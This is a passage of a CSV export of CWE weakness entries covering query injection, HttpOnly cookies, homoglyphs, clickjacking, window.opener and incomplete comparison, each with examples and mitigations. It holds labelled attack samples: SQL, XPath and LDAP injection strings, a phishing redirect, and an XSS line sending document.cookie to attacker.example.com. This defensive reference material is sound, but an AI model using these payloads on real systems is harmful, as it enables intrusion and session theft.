other web site will be able to send requests on behalf of any user tricked into executing it.","Phase:  Architecture and DesignStrategy:  Attack Surface ReductionAvoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningFor Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.Phases:  Architecture and Design; OperationStrategy:  Attack Surface ReductionFor Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."
CWE-943: Improper Neutralization of Special Elements in Data Query Logic,"The product generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.","Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Bypass Protection Mechanism; Read Application Data; Modify Application Data; Varies by Context, Likelihood: ","Example 1The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.(bad code)Example Language:C#...string userName = ctx.getAuthenticatedUserName();string query = ""SELECT * FROM items WHERE owner = '"" + userName + ""' AND itemname = '"" + ItemName.Text + ""'"";sda = new SqlDataAdapter(query, conn);DataTable dt = new DataTable();sda.Fill(dt);...The query that this code intends to execute follows:(informative)SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:(attack code)name' OR 'a'='afor itemName, then the query becomes the following:(attack code)SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';The addition of the:(attack code)OR 'a'='acondition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:(attack code)SELECT * FROM items;This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.Example 2The code below constructs an LDAP query using user input address data:(bad code)Example Language:Javacontext = new InitialDirContext(env);String searchFilter = ""StreetAddress="" + address;NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries.Example 3Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information:(informative)Example Language:XML<users><user><login>john</login><password>abracadabra</password><home_dir>/home/john</home_dir></user><user><login>cbc</login><password>1mgr8</password><home_dir>/home/cbc</home_dir></user></users>The Java code used to retrieve the home directory based on the provided credentials is:(bad code)Example Language:JavaXPath xpath = XPathFactory.newInstance().newXPath();XPathExpression xlogin = xpath.compile(""//users/user[login/text()='"" + login.getUserName() + ""' and password/text() = '"" + login.getPassword() + ""']/home_dir/text()"");Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File(""db.xml""));String homedir = xlogin.evaluate(d);Assume that user ""john"" wishes to leverage XPath Injection and login without a valid password. By providing a username ""john"" and password ""' or ''='"" the XPath expression now becomes(attack code)//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()This lets user ""john"" login without a valid password, thus bypassing authentication.",无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Access Management,This category identifies Software Fault Patterns (SFPs) within the Access Management cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Insecure Resource Access,This category identifies Software Fault Patterns (SFPs) within the Insecure Resource Access cluster (SFP35).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Insecure Resource Permissions,This category identifies Software Fault Patterns (SFPs) within the Insecure Resource Permissions cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Authentication Bypass,This category identifies Software Fault Patterns (SFPs) within the Authentication Bypass cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Digital Certificate,This category identifies Software Fault Patterns (SFPs) within the Digital Certificate cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Endpoint Authentication,This category identifies Software Fault Patterns (SFPs) within the Faulty Endpoint Authentication cluster (SFP29).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Hardcoded Sensitive Data,This category identifies Software Fault Patterns (SFPs) within the Hardcoded Sensitive Data cluster (SFP33).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Insecure Authentication Policy,This category identifies Software Fault Patterns (SFPs) within the Insecure Authentication Policy cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Missing Authentication,This category identifies Software Fault Patterns (SFPs) within the Missing Authentication cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Missing Endpoint Authentication,This category identifies Software Fault Patterns (SFPs) within the Missing Endpoint Authentication cluster (SFP30).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Multiple Binds to the Same Port,This category identifies Software Fault Patterns (SFPs) within the Multiple Binds to the Same Port cluster (SFP32).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unrestricted Authentication,This category identifies Software Fault Patterns (SFPs) within the Unrestricted Authentication cluster (SFP34).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Channel Attack,This category identifies Software Fault Patterns (SFPs) within the Channel Attack cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Protocol Error,This category identifies Software Fault Patterns (SFPs) within the Protocol Error cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Broken Cryptography,This category identifies Software Fault Patterns (SFPs) within the Broken Cryptography cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Weak Cryptography,This category identifies Software Fault Patterns (SFPs) within the Weak Cryptography cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Ambiguous Exception Type,This category identifies Software Fault Patterns (SFPs) within the Ambiguous Exception Type cluster (SFP5).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Incorrect Exception Behavior,This category identifies Software Fault Patterns (SFPs) within the Incorrect Exception Behavior cluster (SFP6).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unchecked Status Condition,This category identifies Software Fault Patterns (SFPs) within the Unchecked Status Condition cluster (SFP4).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Exposed Data,This category identifies Software Fault Patterns (SFPs) within the Exposed Data cluster (SFP23).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Exposure Temporary File,This category identifies Software Fault Patterns (SFPs) within the Exposure Temporary File cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Insecure Session Management,This category identifies Software Fault Patterns (SFPs) within the Insecure Session Management cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Other Exposures,This category identifies Software Fault Patterns (SFPs) within the Other Exposures cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: State Disclosure,This category identifies Software Fault Patterns (SFPs) within the State Disclosure cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Covert Channel,This category identifies Software Fault Patterns (SFPs) within the Covert Channel cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Memory Release,This category identifies Software Fault Patterns (SFPs) within the Faulty Memory Release cluster (SFP12).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Buffer Access,This category identifies Software Fault Patterns (SFPs) within the Faulty Buffer Access cluster (SFP8).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Pointer Use,This category identifies Software Fault Patterns (SFPs) within the Faulty Pointer Use cluster (SFP7).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty String Expansion,This category identifies Software Fault Patterns (SFPs) within the Faulty String Expansion cluster (SFP9).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Improper NULL Termination,This category identifies Software Fault Patterns (SFPs) within the Improper NULL Termination cluster (SFP11).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Incorrect Buffer Length Computation,This category identifies Software Fault Patterns (SFPs) within the Incorrect Buffer Length Computation cluster (SFP10).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Architecture,This category identifies Software Fault Patterns (SFPs) within the Architecture cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Compiler,This category identifies Software Fault Patterns (SFPs) within the Compiler cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Design,This category identifies Software Fault Patterns (SFPs) within the Design cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Implementation,This category identifies Software Fault Patterns (SFPs) within the Implementation cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Failed Chroot Jail,This category identifies Software Fault Patterns (SFPs) within the Failed Chroot Jail cluster (SFP17).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Link in Resource Name Resolution,This category identifies Software Fault Patterns (SFPs) within the Link in Resource Name Resolution cluster (SFP18).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Path Traversal,This category identifies Software Fault Patterns (SFPs) within the Path Traversal cluster (SFP16).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Failure to Release Resource,This category identifies Software Fault Patterns (SFPs) within the Failure to Release Resource cluster (SFP14).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Resource Use,This category identifies Software Fault Patterns (SFPs) within the Faulty Resource Use cluster (SFP15).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Life Cycle,This category identifies Software Fault Patterns (SFPs) within the Life Cycle cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unrestricted Consumption,This category identifies Software Fault Patterns (SFPs) within the Unrestricted Consumption cluster (SFP13).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Missing Lock,This category identifies Software Fault Patterns (SFPs) within the Missing Lock cluster (SFP19).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Multiple Locks/Unlocks,This category identifies Software Fault Patterns (SFPs) within the Multiple Locks/Unlocks cluster (SFP21).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Race Condition Window,This category identifies Software Fault Patterns (SFPs) within the Race Condition Window cluster (SFP20).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unrestricted Lock,This category identifies Software Fault Patterns (SFPs) within the Unrestricted Lock cluster (SFP22).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Tainted Input to Command,This category identifies Software Fault Patterns (SFPs) within the Tainted Input to Command cluster (SFP24).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Tainted Input to Environment,This category identifies Software Fault Patterns (SFPs) within the Tainted Input to Environment cluster (SFP27).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Input Transformation,This category identifies Software Fault Patterns (SFPs) within the Faulty Input Transformation cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Incorrect Input Handling,This category identifies Software Fault Patterns (SFPs) within the Incorrect Input Handling cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Tainted Input to Variable,This category identifies Software Fault Patterns (SFPs) within the Tainted Input to Variable cluster (SFP25).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Feature,This category identifies Software Fault Patterns (SFPs) within the Feature cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Security,This category identifies Software Fault Patterns (SFPs) within the Security cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Information Loss,This category identifies Software Fault Patterns (SFPs) within the Information Loss cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Glitch in Computation,This category identifies Software Fault Patterns (SFPs) within the Glitch in Computation cluster (SFP1).,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: DEPRECATED: Weaknesses without Software Fault Patterns,"This view has been deprecated. It was based on gaps in another view (CWE-888) related to research that is no longer updated, but was complete with respect to CWE at the time it was conducted.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Research Concepts,"This view is intended to facilitate research into weaknesses, including their inter-dependencies, and can be leveraged to systematically identify theoretical gaps within CWE. It is mainly organized according to abstractions of behaviors instead of how they can be detected, where they appear in code, or when they are introduced in the development life cycle. By design, this view is expected to include every weakness within CWE.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Use of an Improper API,This category identifies Software Fault Patterns (SFPs) within the Use of an Improper API cluster (SFP3).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unexpected Entry Points,This category identifies Software Fault Patterns (SFPs) within the Unexpected Entry Points cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses for Simplified Mapping of Published Vulnerabilities,"CWE entries in this view (graph) may be used to categorize potential weaknesses within sources that handle public, third-party vulnerability information, such as the National Vulnerability Database (NVD). By design, this view is incomplete. It is limited to a small number of the most commonly-seen weaknesses, so that it is easier for humans to use. This view uses a shallow hierarchy of two levels in order to simplify the complex navigation of the entire CWE corpus.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag,"The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataIf the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Gain Privileges or Assume IdentityIf the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user., Likelihood: ","Example 1In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.The snippet of code below establishes a new cookie to hold the sessionID.(bad code)Example Language:JavaString sessionID = generateSessionId();Cookie c = new Cookie(""session_id"", sessionID);response.addCookie(c);The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:(attack code)Example Language:JavaScriptdocument.write('<img src=""http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '"">'When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.To mitigate the risk, use the setHttpOnly(true) method.(good code)Example Language:JavaString sessionID = generateSessionId();Cookie c = new Cookie(""session_id"", sessionID);c.setHttpOnly(true);response.addCookie(c);","Phase:  ImplementationLeverage the HttpOnly flag when setting a sensitive cookie in a response.Effectiveness: HighNote:While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie."
CWE CATEGORY: 7PK - Input Validation and Representation,"This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that exist when an application does not properly validate or represent input. According to the authors of the Seven Pernicious Kingdoms, ""Input validation and representation problems are caused by metacharacters, alternate encodings and numeric representations. Security problems result from trusting input.""",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Bad Coding Practices,"Weaknesses in this category are related to coding practices that are deemed unsafe and increase the chances that an exploitable vulnerability will be present in the application. These weaknesses do not directly introduce a vulnerability, but indicate that the product has not been carefully developed or maintained. If a program is complex, difficult to maintain, not portable, or shows evidence of neglect, then there is a higher likelihood that weaknesses are buried in the code.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1007: Insufficient Visual Distinction of Homoglyphs Presented to User,"The product displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action.","Scope: IntegrityConfidentiality, Impact: Technical Impact:OtherAn attacker may ultimately redirect a user to a malicious website, by deceiving the user into believing the URL they are accessing is a trusted domain. However, the attack can also be used to forge log entries by using homoglyphs in usernames. Homoglyph manipulations are often the first step towards executing advanced attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log forgery. If an attacker redirects a user to a malicious site, the attacker can mimic a trusted domain to steal account credentials and perform actions on behalf of the user, without the user's knowledge. Similarly, an attacker could create a username for a website that contains homoglyph characters, making it difficult for an admin to review logs and determine which users performed which actions., Likelihood: ","Example 1The following looks like a simple, trusted URL that a user may frequently access.(attack code)http://www.ÐµxÐ°mÑlÐµ.ÑÐ¾mHowever, the URL above is comprised of Cyrillic characters that look identical to the expected ASCII characters. This results in most users not being able to distinguish between the two and assuming that the above URL is trusted and safe. The ""e"" is actually the ""CYRILLIC SMALL LETTER IE"" which is represented in HTML as the character &#x435, while the ""a"" is actually the ""CYRILLIC SMALL LETTER A"" which is represented in HTML as the character &#x430.  The ""p"", ""c"", and ""o"" are also Cyrillic characters in this example. Viewing the source reveals a URL of ""http://www.&#x435;x&#x430;m&#x440;l&#x435;.&#x441;&#x43e;m"". An adversary can utilize this approach to perform an attack such as a phishing attack in order to drive traffic to a malicious website.Example 2The following displays an example of how creating usernames containing homoglyphs can lead to log forgery.Assume an adversary visits a legitimate, trusted domain and creates an account named ""admin"", except the 'a' and 'i' characters are Cyrillic characters instead of the expected ASCII. Any actions the adversary performs will be saved to the log file and look like they came from a legitimate administrator account.(result)123.123.123.123 Ð°dmÑn [17/Jul/2017:09:05:49 -0400] ""GET /example/users/userlist HTTP/1.1"" 401 12846123.123.123.123 Ð°dmÑn [17/Jul/2017:09:06:51 -0400] ""GET /example/users/userlist HTTP/1.1"" 200 4523123.123.123.123 admin [17/Jul/2017:09:10:02 -0400] ""GET /example/users/editusers HTTP/1.1"" 200 6291123.123.123.123 Ð°dmÑn [17/Jul/2017:09:10:02 -0400] ""GET /example/users/editusers HTTP/1.1"" 200 6291Upon closer inspection, the account that generated three of these log entries is ""&#x430;dm&#x456;n"". Only the third log entry is by the legitimate admin account. This makes it more difficult to determine which actions were performed by the adversary and which actions were executed by the legitimate ""admin"" account.","Phase:  ImplementationUse a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs.Due to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages.Phase:  ImplementationUse an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox.Certain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder."
CWE VIEW: Architectural Concepts,This view organizes weaknesses according to common architectural security tactics. It is intended to assist architects in identifying potential mistakes that can be made when designing software.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Audit,Weaknesses in this category are related to the design and architecture of audit-based components of the system. Frequently these deal with logging user activities in order to identify attackers and modifications to the system. The weaknesses in this category could lead to a degradation of the quality of the audit capability if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Authenticate Actors,Weaknesses in this category are related to the design and architecture of authentication components of the system. Frequently these deal with verifying the entity is indeed who it claims to be. The weaknesses in this category could lead to a degradation of the quality of authentication if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Authorize Actors,"Weaknesses in this category are related to the design and architecture of a system's authorization components. Frequently these deal with enforcing that agents have the required permissions before performing certain operations, such as modifying data. The weaknesses in this category could lead to a degradation of quality of the authorization capability if they are not addressed when designing or implementing a secure architecture.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Cross Cutting,"Weaknesses in this category are related to the design and architecture of multiple security tactics and how they affect a system. For example, information exposure can impact the Limit Access and Limit Exposure security tactics. The weaknesses in this category could lead to a degradation of the quality of many capabilities if they are not addressed when designing or implementing a secure architecture.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Encrypt Data,Weaknesses in this category are related to the design and architecture of data confidentiality in a system. Frequently these deal with the use of encryption libraries. The weaknesses in this category could lead to a degradation of the quality data encryption if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Identify Actors,Weaknesses in this category are related to the design and architecture of a system's identification management components. Frequently these deal with verifying that external agents provide inputs into the system. The weaknesses in this category could lead to a degradation of the quality of identification management if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Limit Access,"Weaknesses in this category are related to the design and architecture of system resources. Frequently these deal with restricting the amount of resources that are accessed by actors, such as memory, network connections, CPU or access points. The weaknesses in this category could lead to a degradation of the quality of authentication if they are not addressed when designing or implementing a secure architecture.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Limit Exposure,Weaknesses in this category are related to the design and architecture of the entry points to a system. Frequently these deal with minimizing the attack surface through designing the system with the least needed amount of entry points. The weaknesses in this category could lead to a degradation of a system's defenses if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Lock Computer,Weaknesses in this category are related to the design and architecture of a system's lockout mechanism. Frequently these deal with scenarios that take effect in case of multiple failed attempts to access a given resource. The weaknesses in this category could lead to a degradation of access to system assets if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Manage User Sessions,Weaknesses in this category are related to the design and architecture of session management. Frequently these deal with the information or status about each user and their access rights for the duration of multiple requests. The weaknesses in this category could lead to a degradation of the quality of session management if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Validate Inputs,"Weaknesses in this category are related to the design and architecture of a system's input validation components. Frequently these deal with sanitizing, neutralizing and validating any externally provided inputs to minimize malformed data from entering the system and preventing code injection in the input data. The weaknesses in this category could lead to a degradation of the quality of data flow in a system if they are not addressed when designing or implementing a secure architecture.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Verify Message Integrity,"Weaknesses in this category are related to the design and architecture of a system's data integrity components. Frequently these deal with ensuring integrity of data, such as messages, resource files, deployment files, and configuration files. The weaknesses in this category could lead to a degradation of data integrity quality if they are not addressed when designing or implementing a secure architecture.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1021: Improper Restriction of Rendered UI Layers or Frames,"The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection Mechanism; Read Application Data; Modify Application DataAn attacker can trick a user into performing actions that are masked and hidden from the user's view. The impact varies widely, depending on the functionality of the underlying application. For example, in a social media application, clickjacking could be used to trik the user into changing privacy settings., Likelihood: ",无示范例子,"Phase:  ImplementationThe use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content.The concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for allowing frames from multiple domains.Phase:  ImplementationA developer can use a ""frame-breaker"" script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned.It is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The ""frame-breaking"" script does not intuitively account for multiple nested frames that can be presented to the user.Phase:  ImplementationThis defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the ""frame-ancestors"" directive or the ""frame-src"" directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content."
CWE-1022: Use of Web Link to Untrusted Target with window.opener Access,"The web application produces links to untrusted external sites outside of its sphere of control, but it does not properly prevent the external site from modifying security-critical properties of the window.opener object, such as the location property.","Scope: Confidentiality, Impact: Technical Impact:Alter Execution LogicThe user may be redirected to an untrusted page that contains undesired content or malicious script code., Likelihood: ","Example 1In this example, the application opens a link in a named window/tab without taking precautions to prevent the called page from tampering with the calling page's location in the browser.There are two ways that this weakness is commonly seen. The first is when the application generates an <a> tag is with target=""_blank"" to point to a target site:(bad code)Example Language:HTML<a href=""http://attacker-site.example.com/useful-page.html"" target=""_blank"">If the attacker offers a useful page on this link (or compromises a trusted, popular site), then a user may click on this link.  However, the attacker could use scripting code to modify the window.opener's location property to redirect the application to a malicious, attacker-controlled page - such as one that mimics the look and feel of the original application and convinces the user to re-enter authentication credentials, i.e. phishing:(attack code)Example Language:JavaScriptwindow.opener.location = 'http://phishing.example.org/popular-bank-page';To mitigate this type of weakness, some browsers support the ""rel"" attribute with a value of ""noopener"", which sets the window.opener object equal to null. Another option is to use the ""rel"" attribute with a value of ""noreferrer"", which in essence does the same thing.(good code)Example Language:HTML<a href=""http://attacker-site.example.com/useful-page.html"" target=""_blank"" rel=""noopener noreferrer"">A second way that this weakness is commonly seen is when opening a new site directly within JavaScript. In this case, a new site is opened using the window.open() function.(bad code)Example Language:JavaScriptvar newWindow = window.open(""http://attacker-site.example.com/useful-page.html"", ""_blank"");To mitigate this, set the window.opener object to null.(good code)Example Language:JavaScriptvar newWindow = window.open(""http://attacker-site.example.com/useful-page.html"", ""_blank"");newWindow.opener = null;","Phase:  Architecture and DesignSpecify in the design that any linked external document must not be granted access to the location object of the calling page.Phase:  ImplementationWhen creating a link to an external document using the <a> tag with a defined target, for example ""_blank"" or a named frame, provide the rel attribute with a value ""noopener noreferrer"".If opening the external document in a new window via javascript, then reset the opener by setting it equal to null.Phase:  ImplementationDo not use ""_blank"" targets. However, this can affect the usability of the application."
CWE-1023: Incomplete Comparison with Missing Factors,"The product performs a comparison between entities that must consider multiple factors or characteristics of each entity, but the comparison does not include one or more of these factors.","Scope: IntegrityAccess Control, Impact: Technical Impact:Alter Execution Logic; Bypass Protection Mechanism, Likelihood: ","Example 1Consider an application in which Truck objects are defined to be the same if they have the same make, the same model, and were manufactured in the same year.(bad code)Example Language:Javapublic class Truck {private String make;private String model;private int year;public boolean equals(Object o) {if (o == null) return false;if (o == this) return true;if (!(o instanceof Truck)) return false;Truck t = (Truck) o;return (this.make.equals(t.getMake()) && this.model.equals(t.getModel()));}}Here, the equals() method only checks the make and model of the Truck objects, but the year of manufacture is not included.Example 2This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded.(bad code)Example Language:C/* IgnoreCWE-259(hard-coded password) andCWE-309(use of password system for authentication) for this example. */char *username = ""admin"";char *pass = ""password"";int AuthenticateUser(char *inUser, char *inPass) {if (strncmp(username, inUser, strlen(inUser))) {logEvent(""Auth failure of username using strlen of inUser"");return(AUTH_FAIL);}if (! strncmp(pass, inPass, strlen(inPass))) {logEvent(""Auth success of password using strlen of inUser"");return(AUTH_SUCCESS);}else {logEvent(""Auth fail of password using sizeof"");return(AUTH_FAIL);}}int main (int argc, char **argv) {int authResult;if (argc < 3) {ExitError(""Usage: Provide a username and password"");}authResult = AuthenticateUser(argv[1], argv[2]);if (authResult == AUTH_SUCCESS) {DoAuthenticatedTask(argv[1]);}else {ExitError(""Authentication failed"");}}In AuthenticateUser(), the strncmp() call uses the string length of an attacker-provided inPass parameter in order to determine how many characters to check in the password. So, if the attacker only provides a password of length 1, the check will only examine the first byte of the application's password before determining success.As a result, this partial comparison leads to improper authentication (CWE-287).Any of these passwords would still cause authentication to succeed for the ""admin"" user:(attack code)ppapaspassThis significantly reduces the search space for an attacker, making brute force attacks more feasible.The same problem also applies to the username, so values such as ""a"" and ""adm"" will succeed for the username.While this demonstrative example may not seem realistic, see the Observed Examples for CVE entries that effectively reflect this same weakness.",Phase:  TestingThoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.
CWE-1024: Comparison of Incompatible Types,"The product performs a comparison between two entities, but the entities are of different, incompatible types that cannot be guaranteed to provide correct results when they are directly compared.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,Phase:  TestingThoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.
